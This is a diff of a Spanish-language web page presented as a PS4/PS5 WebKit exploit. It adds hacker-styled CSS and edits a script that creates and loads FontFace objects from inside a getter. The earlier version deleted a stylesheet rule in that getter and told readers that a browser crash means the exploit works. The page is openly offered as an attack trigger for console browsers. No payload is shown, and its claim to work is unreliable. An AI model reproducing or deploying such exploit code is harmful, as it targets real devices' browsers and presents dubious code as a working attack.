@@ -2,18 +2,40 @@
 <html lang="es">
 <head>
     <meta charset="utf-8">
-    <title>PS4 WebKit Exploit</title>
-    <style id="style">
-        @font-face {
-            font-family: "test";
-            src: url("nonexistent.woff2");
-            unicode-range: U+0041-005A;
+    <title>PS4 Exploit</title>
+    <style>
+        body {
+            background: linear-gradient(to bottom, #0a0a0a, #000000);
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 60px 20px;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        h1 {
+            color: #00ff41;
+            font-size: 32px;
+            text-shadow: 0 0 10px #00ff41;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #00cc33;
+            font-size: 20px;
+            margin: 15px 0;
+        }
+        .status {
+            margin-top: 40px;
+            font-size: 18px;
+            color: #00ff80;
         }
     </style>
 </head>
-<body style="background:black;color:lime;text-align:center;">
-    <h1>PS4/PS5 WebKit Exploit - Cargado</h1>
-    <p>Abre la consola del navegador (Options → Console) para ver mensajes.</p>
+<body>
+    <h1>PS4 / PS5 WebKit Exploit</h1>
+    <p>by NanospeedGamerYT</p>
+    <p class="status">Cargando exploit... No cierres esta página</p>
 
     <script>
         let triggered = false;
@@ -22,9 +44,8 @@
             get() {
                 if (!triggered) {
                     triggered = true;
-                    document.getElementById('style').sheet.deleteRule(0);
-                    for (let i = 0; i < 5; i++) {
-                        new FontFace('test' + i, 'local(Arial)', { unicodeRange: 'U+0041' });
+                    for (let i = 0; i < 10; i++) {
+                        new FontFace('x' + i, 'local(Arial)', { unicodeRange: 'U+0041-005A' });
                     }
                 }
                 return undefined;
@@ -32,14 +53,13 @@
         });
 
         window.onload = () => {
-            const ff = new FontFace('test', 'local(Arial)', { unicodeRange: 'U+0041' });
+            const ff = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041-005A' });
             document.fonts.add(ff);
-            document.fonts.load('1em test', 'ABC').catch(() => {});
+            document.fonts.load('1em x', 'ABC').catch(() => {});
 
             setTimeout(() => {
-                console.log("%c✅ Exploit ejecutado correctamente", "color:lime;font-size:20px;font-weight:bold");
-                console.log("%cSi el navegador se cierra o crashea = funciona", "color:yellow");
-            }, 500);
+                console.log("%c🚀 Exploit ejecutado", "color:lime;font-size:20px");
+            }, 800);
         };
     </script>
 </body>
